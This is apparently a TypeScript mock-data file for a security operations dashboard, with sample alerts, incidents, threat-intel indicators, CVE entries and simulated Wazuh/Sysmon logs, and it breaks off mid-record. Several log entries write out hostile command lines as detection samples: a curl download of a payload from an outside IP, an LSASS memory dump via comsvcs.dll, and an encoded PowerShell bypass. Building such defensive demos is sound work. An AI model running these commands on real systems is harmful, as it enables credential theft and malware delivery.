// Full SOC Cybersecurity Dashboard Mock Data and Utilities

export type Severity = 'critical' | 'high' | 'medium' | 'low' | 'info';
export type AlertStatus = 'open' | 'acknowledged' | 'escalated' | 'closed';
export type IncidentStatus = 'open' | 'in_progress' | 'resolved' | 'closed';
export type PatchStatus = 'completed' | 'in_progress' | 'pending' | 'failed';

export interface Alert {
  id: string;
  timestamp: string;
  source: string;
  destination: string;
  type: string;
  severity: Severity;
  status: AlertStatus;
  protocol: string;
  port?: number | string;
  country: string;
  description: string;
}

export interface Incident {
  id: string;
  title: string;
  priority: Severity;
  status: IncidentStatus;
  impact: 'high' | 'medium' | 'low';
  urgency: 'critical' | 'high' | 'medium' | 'low';
  assignee: string;
  createdAt: string;
  updatedAt: string;
  description: string;
  affectedAssets: string[];
}

export interface ThreatFeed {
  id: string;
  name: string;
  severity: Severity;
  category: string;
  description: string;
  source: string;
  confidence: number;
  timestamp: string;
}

export interface IOC {
  id: string;
  type: 'ip' | 'domain' | 'hash' | 'url';
  value: string;
  firstSeen: string;
  lastSeen: string;
  threatLevel: Severity;
  tags: string[];
  hitCount: number;
}

export interface NetworkConnection {
  id: string;
  sourceIp: string;
  destIp: string;
  port: number;
  protocol: string;
  status: 'established' | 'suspicious' | 'listening' | 'closed';
  duration: string;
  bytesIn: number;
  bytesOut: number;
  country: string;
}

export interface Vulnerability {
  id: string;
  cveId: string;
  description: string;
  cvssScore: number;
  severity: Severity;
  vendor: string;
  product: string;
  affectedAssets: string[];
  patchStatus: PatchStatus;
}

export interface ReportTemplate {
  id: string;
  name: string;
  frequency: string;
  description: string;
  estimatedPages: number;
}

export interface ScheduledReport {
  id: string;
  name: string;
  frequency: string;
  nextRun: string;
  recipients: string;
  status: 'active' | 'paused';
}

// KPI Data
export const kpiData = [
  { label: 'Total Threats', value: 1482, change: 12.4, changeType: 'increase' as const },
  { label: 'Active Incidents', value: 7, change: -2, changeType: 'decrease' as const },
  { label: 'Vulnerabilities', value: 43, change: 5.1, changeType: 'increase' as const },
  { label: 'Blocked Attacks', value: 8920, change: 18.7, changeType: 'increase' as const },
];

// 24h Threat Activity
export const threatActivity = [
  { time: '00:00', threats: 24, blocked: 82, alerts: 14 },
  { time: '02:00', threats: 18, blocked: 65, alerts: 11 },
  { time: '04:00', threats: 15, blocked: 54, alerts: 8 },
  { time: '06:00', threats: 32, blocked: 110, alerts: 19 },
  { time: '08:00', threats: 68, blocked: 240, alerts: 42 },
  { time: '10:00', threats: 94, blocked: 350, alerts: 61 },
  { time: '12:00', threats: 112, blocked: 420, alerts: 74 },
  { time: '14:00', threats: 128, blocked: 490, alerts: 89 },
  { time: '16:00', threats: 105, blocked: 390, alerts: 68 },
  { time: '18:00', threats: 88, blocked: 310, alerts: 54 },
  { time: '20:00', threats: 72, blocked: 260, alerts: 45 },
  { time: '22:00', threats: 45, blocked: 180, alerts: 28 },
];

// Severity Distribution
export const severityDistribution = [
  { name: 'Critical', value: 14, color: '#ff4757' },
  { name: 'High', value: 38, color: '#ffa502' },
  { name: 'Medium', value: 65, color: '#ffd32a' },
  { name: 'Low', value: 92, color: '#00ff88' },
];

// Threat Categories
export const threatCategories = [
  { category: 'Brute Force', count: 45, color: '#ff4757' },
  { category: 'SQL Injection', count: 32, color: '#ffa502' },
  { category: 'Malware C2', count: 28, color: '#ff6b81' },
  { category: 'DDoS Flood', count: 24, color: '#00d4ff' },
  { category: 'Phishing', count: 21, color: '#a55eea' },
  { category: 'Port Scanning', count: 18, color: '#2ed573' },
  { category: 'Ransomware', count: 12, color: '#eb4d4b' },
];

// System Health
export const systemHealth = [
  { name: 'Wazuh Cluster Core', status: 'online', load: 48 },
  { name: 'Suricata NIDS Engine', status: 'online', load: 72 },
  { name: 'Elasticsearch Indexer', status: 'online', load: 64 },
  { name: 'Cortex SOAR Responder', status: 'online', load: 39 },
  { name: 'MISP Threat Intel Sync', status: 'online', load: 28 },
  { name: 'Zeek Network Broker', status: 'warning', load: 82 },
  { name: 'Vault PKI Guardian', status: 'online', load: 21 },
  { name: 'Cloudflare Perimeter', status: 'online', load: 45 }
];

// Top Attack Origins
export const attackOrigins = [
  { code: 'CN', country: 'China', attacks: 4890 },
  { code: 'RU', country: 'Russia', attacks: 4120 },
  { code: 'IR', country: 'Iran', attacks: 2640 },
  { code: 'KP', country: 'North Korea', attacks: 1980 },
  { code: 'BR', country: 'Brazil', attacks: 1450 },
  { code: 'US', country: 'United States', attacks: 1120 },
  { code: 'NL', country: 'Netherlands', attacks: 940 },
];

// Alerts
export const initialAlerts: Alert[] = [
  {
    id: 'ALT-1092',
    timestamp: '2026-09-16 02:04:12',
    source: '185.220.101.5',
    destination: '10.0.1.5 (DC-PROD-01)',
    type: 'Mimikatz LSASS Memory Dump',
    severity: 'critical',
    status: 'open',
    protocol: 'TCP',
    port: 445,
    country: 'RU',
    description: 'LSASS process memory access detected via procdump utility attempting credential harvesting.'
  },
  {
    id: 'ALT-1091',
    timestamp: '2026-09-16 01:58:33',
    source: '198.51.100.44',
    destination: '10.0.1.20 (BASTION-01)',
    type: 'SSH Brute Force Attack',
    severity: 'high',
    status: 'escalated',
    protocol: 'TCP',
    port: 22,
    country: 'CN',
    description: 'Over 280 failed SSH authentication attempts within 60 seconds from external IP.'
  },
  {
    id: 'ALT-1090',
    timestamp: '2026-09-16 01:45:10',
    source: '203.0.113.12',
    destination: '10.0.2.10 (WEB-PROD-01)',
    type: 'Web Shell Dropper Execution',
    severity: 'critical',
    status: 'open',
    protocol: 'HTTP',
    port: 443,
    country: 'IR',
    description: 'Anomalous PHP file write detected in uploads directory followed by immediate execution.'
  },
  {
    id: 'ALT-1089',
    timestamp: '2026-09-16 01:22:49',
    source: '10.0.4.15',
    destination: '185.165.170.8',
    type: 'Malware C2 Beaconing',
    severity: 'high',
    status: 'acknowledged',
    protocol: 'HTTPS',
    port: 8443,
    country: 'NL',
    description: 'Periodic heartbeats with jitter matching Cobalt Strike malleable C2 profile.'
  },
  {
    id: 'ALT-1088',
    timestamp: '2026-09-16 00:54:18',
    source: '10.0.3.18',
    destination: '8.8.8.8',
    type: 'DNS Tunneling Exfiltration',
    severity: 'medium',
    status: 'acknowledged',
    protocol: 'UDP',
    port: 53,
    country: 'US',
    description: 'High entropy subdomain queries exceeding 70 characters indicating data staging.'
  },
  {
    id: 'ALT-1087',
    timestamp: '2026-09-16 00:31:02',
    source: '91.240.118.2',
    destination: '10.0.1.1 (FIREWALL-EDGE)',
    type: 'SYN Flood DDoS',
    severity: 'high',
    status: 'closed',
    protocol: 'TCP',
    port: 80,
    country: 'RU',
    description: 'SYN flood spike of 45,000 pps mitigated automatically via BGP blackholing rule.'
  },
  {
    id: 'ALT-1086',
    timestamp: '2026-09-15 23:49:15',
    source: '10.0.4.88',
    destination: '10.0.1.5 (DC-PROD-01)',
    type: 'Kerberoasting Ticket Request',
    severity: 'high',
    status: 'closed',
    protocol: 'Kerberos',
    port: 88,
    country: 'PK',
    description: 'Service Principal Name RC4-HMAC ticket requests for multiple high-privilege service accounts.'
  },
  {
    id: 'ALT-1085',
    timestamp: '2026-09-15 23:12:44',
    source: '10.0.2.10',
    destination: '10.0.2.50 (DB-CLUSTER)',
    type: 'SQL Injection Union Extract',
    severity: 'medium',
    status: 'closed',
    protocol: 'SQL',
    port: 3306,
    country: 'INTERNAL',
    description: 'UNION SELECT statement intercepted by WAF rule #942100 with zero impact.'
  },
];

// Incidents
export const initialIncidents: Incident[] = [
  {
    id: 'INC-2026-088',
    title: 'Cobalt Strike C2 Beaconing on Corporate Workstation',
    priority: 'critical',
    status: 'in_progress',
    impact: 'high',
    urgency: 'critical',
    assignee: 'Muhammad Zaib Zafar',
    createdAt: '2026-09-16 01:25:00',
    updatedAt: '2026-09-16 02:00:15',
    description: 'Endpoint FIN-WKS-042 triggered multiple high-severity alerts. Host isolated from corporate network. Memory triage underway.',
    affectedAssets: ['FIN-WKS-042', 'CORP-VLAN-20', 'DC-PROD-01']
  },
  {
    id: 'INC-2026-087',
    title: 'Distributed Credential Stuffing on Customer Portal',
    priority: 'high',
    status: 'open',
    impact: 'high',
    urgency: 'high',
    assignee: 'Sarah Chen',
    createdAt: '2026-09-16 00:14:20',
    updatedAt: '2026-09-16 01:45:10',
    description: 'Botnet originating from residential proxies attempting 120k authentication combos against login API.',
    affectedAssets: ['WEB-PROD-01', 'API-GATEWAY-02']
  },
  {
    id: 'INC-2026-086',
    title: 'Suspicious Webroot Modification on Public Server',
    priority: 'high',
    status: 'resolved',
    impact: 'medium',
    urgency: 'high',
    assignee: 'Marcus Rivera',
    createdAt: '2026-09-15 21:50:00',
    updatedAt: '2026-09-15 23:30:00',
    description: 'Web shell dropper neutralized by Wazuh Syscheck automated active response script.',
    affectedAssets: ['WEB-PROD-01']
  },
  {
    id: 'INC-2026-085',
    title: 'Ransomware Precursor: Volume Shadow Copy Deletion',
    priority: 'critical',
    status: 'closed',
    impact: 'high',
    urgency: 'critical',
    assignee: 'Muhammad Zaib Zafar',
    createdAt: '2026-09-14 18:20:00',
    updatedAt: '2026-09-15 10:15:00',
    description: 'VSSadmin delete shadows command intercepted and process terminated before encryption could initiate.',
    affectedAssets: ['BACKUP-NAS-01', 'SRV-FILE-03']
  }
];

// Threat Feeds
export const threatFeeds: ThreatFeed[] = [
  {
    id: 'TF-01',
    name: 'APT29 Cozy Bear Phishing Infrastructure',
    severity: 'critical',
    category: 'Nation-State APT',
    description: 'New DNS fast-flux infrastructure linked to Russian SVR spearphishing campaigns targeting defense contractors.',
    source: 'CyberShield Threat Intel Sync',
    confidence: 96,
    timestamp: '15 mins ago'
  },
  {
    id: 'TF-02',
    name: 'LockBit 4.0 Ransomware Encryptor Signatures',
    severity: 'critical',
    category: 'Ransomware',
    description: 'Updated Yara detection rules for new obfuscated loader utilizing DLL sideloading via legitimate binaries.',
    source: 'CISA Alert Feed',
    confidence: 94,
    timestamp: '42 mins ago'
  },
  {
    id: 'TF-03',
    name: 'Volt Typhoon Living-off-the-Land Binaries (LOLBins)',
    severity: 'high',
    category: 'Critical Infrastructure',
    description: 'Detection heuristics for wmic and certutil misuse across air-gapped SCADA telemetries.',
    source: 'NSA Cybersecurity Advisory',
    confidence: 91,
    timestamp: '2 hours ago'
  },
  {
    id: 'TF-04',
    name: 'Qakbot Malspam Delivery Campaigns Resurface',
    severity: 'medium',
    category: 'Banking Trojan / Infostealer',
    description: 'Password-protected ZIP archives containing OneNote and LNK execution vectors.',
    source: 'AlienVault OTX Pulse',
    confidence: 85,
    timestamp: '4 hours ago'
  }
];

// Indicators of Compromise (IOC)
export const iocs: IOC[] = [
  { id: 'ioc-1', type: 'ip', value: '185.220.101.5', firstSeen: '2026-09-10', lastSeen: '10 mins ago', threatLevel: 'critical', tags: ['CobaltStrike', 'C2'], hitCount: 142 },
  { id: 'ioc-2', type: 'domain', value: 'cdn-cloud-telemetry.org', firstSeen: '2026-09-12', lastSeen: '1 hour ago', threatLevel: 'critical', tags: ['Phishing', 'FastFlux'], hitCount: 88 },
  { id: 'ioc-3', type: 'hash', value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', firstSeen: '2026-09-14', lastSeen: '3 hours ago', threatLevel: 'high', tags: ['Mimikatz', 'Sha256'], hitCount: 19 },
  { id: 'ioc-4', type: 'url', value: 'http://185.165.170.8:8080/payload.ps1', firstSeen: '2026-09-15', lastSeen: '4 hours ago', threatLevel: 'high', tags: ['PowerShell', 'Dropper'], hitCount: 34 },
  { id: 'ioc-5', type: 'ip', value: '198.51.100.44', firstSeen: '2026-09-15', lastSeen: '30 mins ago', threatLevel: 'medium', tags: ['SSH-Brute', 'Scanner'], hitCount: 312 },
  { id: 'ioc-6', type: 'domain', value: 'secure-login-mfa-verify.net', firstSeen: '2026-09-13', lastSeen: '6 hours ago', threatLevel: 'critical', tags: ['Evilginx', 'AiTM'], hitCount: 95 }
];

// MITRE ATT&CK Matrix Data
export const mitreAttack = [
  { id: 'recon', tactic: 'Reconnaissance', techniques: ['T1595 Active Scan', 'T1592 Gather Host', 'T1589 Gather Identity'], detected: ['T1595 Active Scan'] },
  { id: 'init-access', tactic: 'Initial Access', techniques: ['T1190 Exploit Public', 'T1566 Phishing', 'T1078 Valid Accounts'], detected: ['T1190 Exploit Public', 'T1566 Phishing'] },
  { id: 'execution', tactic: 'Execution', techniques: ['T1059 Command Line', 'T1204 User Exec', 'T1047 WMI'], detected: ['T1059 Command Line'] },
  { id: 'persistence', tactic: 'Persistence', techniques: ['T1505 Web Shell', 'T1053 Scheduled Task', 'T1543 Create Service'], detected: ['T1505 Web Shell'] },
  { id: 'priv-esc', tactic: 'Privilege Escalation', techniques: ['T1548 Abuse Elevation', 'T1068 Exploit Priv', 'T1055 Process Injection'], detected: ['T1548 Abuse Elevation'] },
  { id: 'defense-evasion', tactic: 'Defense Evasion', techniques: ['T1070 Indicator Removal', 'T1027 Obfuscation', 'T1562 Impair Defenses'], detected: ['T1027 Obfuscation'] },
  { id: 'cred-access', tactic: 'Credential Access', techniques: ['T1003 OS Cred Dumping', 'T1110 Brute Force', 'T1558 Steal Kerberos'], detected: ['T1003 OS Cred Dumping', 'T1110 Brute Force'] },
  { id: 'discovery', tactic: 'Discovery', techniques: ['T1087 Account Discovery', 'T1046 Network Service', 'T1082 System Info'], detected: ['T1046 Network Service'] },
  { id: 'lateral-move', tactic: 'Lateral Movement', techniques: ['T1021 Remote Services', 'T1570 Lateral Tool', 'T1563 SSH Hijack'], detected: ['T1021 Remote Services'] },
  { id: 'c2', tactic: 'Command & Control', techniques: ['T1071 App Protocol', 'T1571 Non-Standard Port', 'T1572 Protocol Tunnel'], detected: ['T1071 App Protocol', 'T1571 Non-Standard Port'] },
  { id: 'exfiltration', tactic: 'Exfiltration', techniques: ['T1048 Exfil Alt Protocol', 'T1567 Cloud Exfil', 'T1020 Auto Exfil'], detected: ['T1048 Exfil Alt Protocol'] },
  { id: 'impact', tactic: 'Impact', techniques: ['T1486 Encrypt Data', 'T1489 Service Stop', 'T1490 Inhibit Recovery'], detected: ['T1490 Inhibit Recovery'] }
];

// Network Traffic Data (24h)
export const networkTraffic = [
  { time: '00:00', inbound: 4.2, outbound: 2.1 },
  { time: '03:00', inbound: 3.1, outbound: 1.8 },
  { time: '06:00', inbound: 6.8, outbound: 3.5 },
  { time: '09:00', inbound: 14.5, outbound: 8.9 },
  { time: '12:00', inbound: 18.2, outbound: 11.4 },
  { time: '15:00', inbound: 19.8, outbound: 13.2 },
  { time: '18:00', inbound: 15.4, outbound: 9.8 },
  { time: '21:00', inbound: 9.1, outbound: 5.6 },
];

// Protocol Distribution
export const protocolDistribution = [
  { name: 'HTTPS (443)', value: 58, color: '#00d4ff' },
  { name: 'HTTP (80)', value: 14, color: '#38bdf8' },
  { name: 'DNS (53)', value: 12, color: '#a855f7' },
  { name: 'SSH (22)', value: 8, color: '#22c55e' },
  { name: 'Database (3306/5432)', value: 5, color: '#eab308' },
  { name: 'Other', value: 3, color: '#ef4444' },
];

// Active Network Connections
export const initialNetworkConnections: NetworkConnection[] = [
  { id: 'conn-1', sourceIp: '185.220.101.5', destIp: '10.0.1.5', port: 4444, protocol: 'TCP', status: 'suspicious', duration: '00:14:22', bytesIn: 245000, bytesOut: 1840000, country: 'RU' },
  { id: 'conn-2', sourceIp: '10.0.4.15', destIp: '185.165.170.8', port: 8443, protocol: 'HTTPS', status: 'suspicious', duration: '01:04:10', bytesIn: 120000, bytesOut: 480000, country: 'NL' },
  { id: 'conn-3', sourceIp: '198.51.100.44', destIp: '10.0.1.20', port: 22, protocol: 'SSH', status: 'suspicious', duration: '00:03:45', bytesIn: 84000, bytesOut: 12000, country: 'CN' },
  { id: 'conn-4', sourceIp: '10.0.1.10', destIp: '142.250.180.206', port: 443, protocol: 'HTTPS', status: 'established', duration: '04:12:00', bytesIn: 18400000, bytesOut: 3200000, country: 'US' },
  { id: 'conn-5', sourceIp: '10.0.2.10', destIp: '10.0.2.50', port: 5432, protocol: 'PostgreSQL', status: 'established', duration: '18:30:00', bytesIn: 45000000, bytesOut: 89000000, country: 'PK' },
  { id: 'conn-6', sourceIp: '0.0.0.0', destIp: '10.0.1.5', port: 445, protocol: 'SMB', status: 'listening', duration: '48:00:00', bytesIn: 0, bytesOut: 0, country: 'INTERNAL' },
];

// Vulnerabilities (CVE)
export const vulnerabilities: Vulnerability[] = [
  { id: 'v-1', cveId: 'CVE-2024-3400', description: 'Palo Alto PAN-OS Command Injection Vulnerability allows unauthenticated OS command execution.', cvssScore: 10.0, severity: 'critical', vendor: 'Palo Alto', product: 'PAN-OS GlobalProtect', affectedAssets: ['FW-EDGE-01', 'FW-BACKUP-02'], patchStatus: 'pending' },
  { id: 'v-2', cveId: 'CVE-2024-21887', description: 'Ivanti Connect Secure Command Injection allowing authenticated admin arbitrary execution.', cvssScore: 9.1, severity: 'critical', vendor: 'Ivanti', product: 'Connect Secure VPN', affectedAssets: ['VPN-GATEWAY-01'], patchStatus: 'in_progress' },
  { id: 'v-3', cveId: 'CVE-2023-44487', description: 'HTTP/2 Rapid Reset DDoS vulnerability causing server CPU exhaustion.', cvssScore: 7.5, severity: 'high', vendor: 'Apache / NGINX', product: 'Web Servers', affectedAssets: ['WEB-PROD-01', 'WEB-PROD-02', 'API-PROXY-01'], patchStatus: 'completed' },
  { id: 'v-4', cveId: 'CVE-2023-38831', description: 'WinRAR Remote Code Execution vulnerability exploited via spoofed file extensions.', cvssScore: 7.8, severity: 'high', vendor: 'Rarlab', product: 'WinRAR Desktop', affectedAssets: ['FIN-WKS-042', 'DEV-LAPTOP-09'], patchStatus: 'completed' },
  { id: 'v-5', cveId: 'CVE-2024-6387', description: 'RegreSSHion: Remote Unauthenticated Code Execution in OpenSSH server.', cvssScore: 8.1, severity: 'high', vendor: 'OpenSSH', product: 'OpenSSH Server', affectedAssets: ['BASTION-01', 'CORP-SRV-03'], patchStatus: 'in_progress' },
  { id: 'v-6', cveId: 'CVE-2023-22515', description: 'Atlassian Confluence Data Center Privilege Escalation allowing external setup overwrite.', cvssScore: 9.8, severity: 'critical', vendor: 'Atlassian', product: 'Confluence Wiki', affectedAssets: ['WIKI-CORP-01'], patchStatus: 'completed' },
  { id: 'v-7', cveId: 'CVE-2024-21413', description: 'Microsoft Outlook Moniker Remote Code Execution bypasses Protected View.', cvssScore: 9.8, severity: 'critical', vendor: 'Microsoft', product: 'Office 365 / Outlook', affectedAssets: ['FIN-WKS-042', 'EXEC-PC-01'], patchStatus: 'pending' },
  { id: 'v-8', cveId: 'CVE-2024-23897', description: 'Jenkins CLI Arbitrary File Read leading to Remote Code Execution.', cvssScore: 9.8, severity: 'critical', vendor: 'Jenkins', product: 'Jenkins CI/CD', affectedAssets: ['CI-BUILDER-01'], patchStatus: 'completed' }
];

export const vulnBySeverity = [
  { name: 'Critical', count: 5, color: '#ff4757' },
  { name: 'High', count: 3, color: '#ffa502' },
  { name: 'Medium', count: 8, color: '#ffd32a' },
  { name: 'Low', count: 12, color: '#00ff88' },
];

export const assetRisk = [
  { asset: 'WEB-PROD-01', risk: 92, vulns: 3, critical: 2 },
  { asset: 'DC-PROD-01', risk: 88, vulns: 2, critical: 1 },
  { asset: 'VPN-GATEWAY-01', risk: 85, vulns: 2, critical: 2 },
  { asset: 'BASTION-01', risk: 76, vulns: 1, critical: 1 },
  { asset: 'FIN-WKS-042', risk: 65, vulns: 4, critical: 0 },
  { asset: 'DEV-LAPTOP-09', risk: 54, vulns: 3, critical: 0 },
];

// Report Templates
export const reportTemplates: ReportTemplate[] = [
  { id: 'rep-1', name: 'Executive Daily Security Summary', frequency: 'Daily', description: 'Executive-level summary of total blocked intrusions, critical incidents, and perimeter availability.', estimatedPages: 4 },
  { id: 'rep-2', name: 'Weekly Threat Intelligence Briefing', frequency: 'Weekly', description: 'Detailed deep-dive into active adversary IOCs, MITRE ATT&CK coverage, and C2 telemetry patterns.', estimatedPages: 12 },
  { id: 'rep-3', name: 'Incident Post-Mortem & Timeline', frequency: 'On-Demand', description: 'Forensic event logs, compromised assets, eradication steps, and preventative recommendations.', estimatedPages: 8 },
  { id: 'rep-4', name: 'PCI-DSS & ISO 27001 Compliance Audit', frequency: 'Monthly', description: 'Access control audits, password complexity, encryption in transit, and firewall rule telemetry.', estimatedPages: 18 },
  { id: 'rep-5', name: 'Enterprise Vulnerability Assessment', frequency: 'Bi-Weekly', description: 'Full CVE vulnerability inventory sorted by CVSS 3.1 score with patch management SLA metrics.', estimatedPages: 15 }
];

export const scheduledReports: ScheduledReport[] = [
  { id: 'sch-1', name: 'Daily SOC Shift Handover Report', frequency: 'Daily at 08:00 PKT', nextRun: 'Tomorrow 08:00', recipients: 'soc-tier1@cybershield.pk, lead@cybershield.pk', status: 'active' },
  { id: 'sch-2', name: 'Weekly CISO Threat Landscape Digest', frequency: 'Every Monday 09:00', nextRun: 'Monday 09:00', recipients: 'ciso@cybershield.pk, zaibzafar936@gmail.com', status: 'active' },
  { id: 'sch-3', name: 'Monthly ISO 27001 Evidence Bundle', frequency: '1st of Month', nextRun: 'Oct 01, 00:00', recipients: 'compliance@cybershield.pk', status: 'active' },
  { id: 'sch-4', name: 'Emergency IOC Quarantine Broadcast', frequency: 'Ad-hoc Event-Driven', nextRun: 'On Critical Trigger', recipients: 'firewall-admins@cybershield.pk', status: 'paused' }
];

// Helper formatting utilities
export function formatNumber(num: number): string {
  if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
  if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
  return num.toString();
}

export function formatBytes(bytes: number): string {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

export function getCvssColor(score: number): string {
  if (score >= 9.0) return 'text-red-400 bg-red-950/60 border border-red-500/40';
  if (score >= 7.0) return 'text-orange-400 bg-orange-950/60 border border-orange-500/40';
  if (score >= 4.0) return 'text-amber-400 bg-amber-950/60 border border-amber-500/40';
  return 'text-emerald-400 bg-emerald-950/60 border border-emerald-500/40';
}

export function getSeverityBadgeStyle(sev: string): { text: string; bg: string; border: string } {
  const s = sev.toLowerCase();
  switch (s) {
    case 'critical':
      return { text: 'text-red-300', bg: 'bg-red-950/80', border: 'border-red-500/50' };
    case 'high':
      return { text: 'text-orange-300', bg: 'bg-orange-950/80', border: 'border-orange-500/50' };
    case 'medium':
      return { text: 'text-amber-300', bg: 'bg-amber-950/80', border: 'border-amber-500/50' };
    case 'low':
      return { text: 'text-emerald-300', bg: 'bg-emerald-950/80', border: 'border-emerald-500/50' };
    default:
      return { text: 'text-cyan-300', bg: 'bg-cyan-950/80', border: 'border-cyan-500/50' };
  }
}

// ----------------------------------------------------
// Windows Wazuh Live Stream Log Definition
// ----------------------------------------------------
export interface WazuhLiveLog {
  id: string;
  timestamp: string;
  eventId: number;
  provider: 'Microsoft-Windows-Sysmon' | 'Microsoft-Windows-Security-Auditing' | 'Wazuh-Agent' | 'Windows-Defender';
  level: 'CRITICAL' | 'WARNING' | 'INFORMATION';
  channel: 'Security' | 'Microsoft-Windows-Sysmon/Operational' | 'System';
  computer: string;
  sourceIp?: string;
  processName?: string;
  commandLine?: string;
  user: string;
  ruleId: string;
  ruleDescription: string;
  mitreTactic?: string;
}

export const initialWazuhLogs: WazuhLiveLog[] = [
  {
    id: 'WZ-LOG-9001',
    timestamp: '2026-09-16 02:22:15',
    eventId: 1,
    provider: 'Microsoft-Windows-Sysmon',
    level: 'CRITICAL',
    channel: 'Microsoft-Windows-Sysmon/Operational',
    computer: 'WIN11-OFFICE-01',
    processName: 'powershell.exe',
    commandLine: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...',
    user: 'CORP\\m.zaib',
    ruleId: '92001',
    ruleDescription: 'Suspicious Encoded PowerShell execution spawned by Microsoft Word',
    mitreTactic: 'Execution (T1059.001)'
  },
  {
    id: 'WZ-LOG-9002',
    timestamp: '2026-09-16 02:22:01',
    eventId: 10,
    provider: 'Microsoft-Windows-Sysmon',
    level: 'CRITICAL',
    channel: 'Microsoft-Windows-Sysmon/Operational',
    computer: 'WIN11-OFFICE-01',
    processName: 'rundll32.exe',
    commandLine: 'rundll32.exe comsvcs.dll, MiniDump 648 C:\\temp\\lsass.dmp full',
    user: 'NT AUTHORITY\\SYSTEM',
    ruleId: '92004',
    ruleDescription: 'LSASS memory dump via Comsvcs DLL execution detected',
    mitreTactic: 'Credential Access (T1003.001)'
  },
  {
    id: 'WZ-LOG-9003',
    timestamp: '2026-09-16 02:21:44',
    eventId: 3,
    provider: 'Microsoft-Windows-Sysmon',
    level: 'WARNING',
    channel: 'Microsoft-Windows-Sysmon/Operational',
    computer: 'WIN11-OFFICE-01',
    sourceIp: '185.220.101.5',
    processName: 'svchost.exe',
    commandLine: 'svchost.exe -k netsvcs -p -s BITS',
    user: 'NT AUTHORITY\\SYSTEM',
    ruleId: '92010',
    ruleDescription: 'Outbound raw socket to suspected Tor exit relay / C2 node',
    mitreTactic: 'Command and Control (T1071)'
  },
  {
    id: 'WZ-LOG-9004',
    timestamp: '2026-09-16 02:20:50',
    eventId: 4625,
    provider: 'Microsoft-Windows-Security-Auditing',
    level: 'WARNING',
    channel: 'Security',
    computer: 'WIN11-OFFICE-01',
    sourceIp: '192.168.1.145',
    user: 'CORP\\Administrator',
    ruleId: '60122',
    ruleDescription: 'Logon failure - Unknown user name or bad password via SMB',
    mitreTactic: 'Credential Access (T1110.001)'
  },
  {
    id: 'WZ-LOG-9005',
    timestamp: '2026-09-16 02:19:12',
    eventId: 4624,
    provider: 'Microsoft-Windows-Security-Auditing',
    level: 'INFORMATION',
    channel: 'Security',
    computer: 'WIN11-OFFICE-01',
    sourceIp: '192.168.1.100',
    user: 'CORP\\m.zaib',
    ruleId: '60100',
    ruleDescription: 'An account was successfully logged on (Logon Type 2 - Interactive)',
    mitreTactic: 'Initial Access (T1078)'
  },
  {
    id: 'WZ-LOG-9006',
    timestamp: '2026-09-16 02:18:30',
    eventId: 11,
    provider: 'Microsoft-Windows-Sysmon',
    level: 'WARNING',
    channel: 'Microsoft-Windows-Sysmon/Operational',
    computer: 'WIN11-OFFICE-01',
    processName: 'curl.exe',
    commandLine: 'curl.exe -s http://194.26.29.112/payload.exe -o C:\\Users\\Public\\updater.exe',
    user: 'CORP\\m.zaib',
    ruleId: '92015',
    ruleDescription: 'Executable dropped into Public directory via Command-Line curl',
    mitreTactic: 'Ingress Tool Transfer (T1105)'
  },
  {
    id: 'WZ-LOG-9007',
    timestamp: '2026-09-16 02:17:04',
    eventId: 1,
    provider: 'Microsoft-Windows-Sysmon',
    level: 'INFORMATION',
    channel: 'Microsoft-Windows-Sysmon/Operational',
    computer: 'WIN11-OFFICE-01',
    processName: 'chrome.exe',
    commandLine: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --profile-directory=Default',
    user: 'CORP\\m.zaib',
    ruleId: '60002',
    ruleDescription: 'Standard process execution: Google Chrome Browser',
    mitreTactic: 'Execution (T1204)'
  }
];

// ----------------------------------------------------
// Endpoint Activity Profile Database (By IP)
// ----------------------------------------------------
export interface EndpointProfile {
  ip: string;
  hostname: string;
  status: 'online' | 'compromised' | 'quarantined' | 'offline';
  os: string;
  osArchitecture: string;
  wazuhAgentId: string;
  uptime: string;
  macAddress: string;
  gateway: string;
  domain: string;
  cpuLoad: number;
  memoryLoad: number;
  lastHeartbeat: string;
  riskScore: number; // 0 - 100
  // Free Activities
  freeActivities: {
    standardProcesses: { pid: number; name: string; cpu: string; memory: string; user: string }[];
    openPorts: { port: number; proto: string; state: string; service: string }[];
    recentBasicLogons: { timestamp: string; user: string; logonType: string; status: 'SUCCESS' | 'FAILED' }[];
  };
  // Advanced Activities (Locked / Paid Tier)
  advancedActivities: {
    memoryTriage: {
      lsassDumpAttempted: boolean;
      unbackedExecutableMemoryPages: number;
      hollowedProcesses: string[];
      injectedDlls: { dll: string; targetProcess: string; signer: string }[];
    };
    processLineageTree: {
      parent: string;
      child: string;
      cmd: string;
      pid: number;
      integrityLevel: 'System' | 'High' | 'Medium';
      hash: string;
    }[];
    networkBeaconing: {
      destIp: string;
      domain: string;
      beaconIntervalSec: number;
      jitterPercent: number;
      threatIntelFlag: string;
    }[];
    activeResponseAvailable: {
      hostIsolationAvailable: boolean;
      remoteShellAvailable: boolean;
      processKillAvailable: boolean;
      firewallDropAvailable: boolean;
    };
  };
}

export const sampleEndpoints: Record<string, EndpointProfile> = {
  '192.168.1.105': {
    ip: '192.168.1.105',
    hostname: 'WIN11-OFFICE-01',
    status: 'compromised',
    os: 'Microsoft Windows 11 Enterprise (Build 22631)',
    osArchitecture: 'x86_64 (64-bit AMD/Intel)',
    wazuhAgentId: '007',
    uptime: '14 days, 6 hours',
    macAddress: '00:1A:2B:3C:4D:5E',
    gateway: '192.168.1.1 (FortiGate-60F)',
    domain: 'CORP.CYBERSHIELD.PK',
    cpuLoad: 78,
    memoryLoad: 84,
    lastHeartbeat: '3 seconds ago',
    riskScore: 89,
    freeActivities: {
      standardProcesses: [
        { pid: 4820, name: 'explorer.exe', cpu: '1.2%', memory: '112 MB', user: 'CORP\\m.zaib' },
        { pid: 1044, name: 'svchost.exe', cpu: '0.4%', memory: '48 MB', user: 'NT AUTHORITY\\SYSTEM' },
        { pid: 6112, name: 'chrome.exe', cpu: '4.8%', memory: '420 MB', user: 'CORP\\m.zaib' },
